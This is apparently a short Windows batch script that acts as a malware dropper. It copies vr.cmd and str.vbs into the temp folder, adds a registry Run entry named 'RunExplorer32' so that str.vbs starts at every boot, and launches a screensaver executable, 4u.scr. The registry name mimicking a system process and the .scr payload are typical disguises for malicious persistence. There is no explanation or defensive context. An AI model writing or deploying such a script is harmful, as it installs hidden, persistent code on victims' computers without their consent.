copy vr.cmd %temp%\vr.cmd
copy str.vbs %temp%\str.vbs
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %temp%\str.vbs /f
4u.scr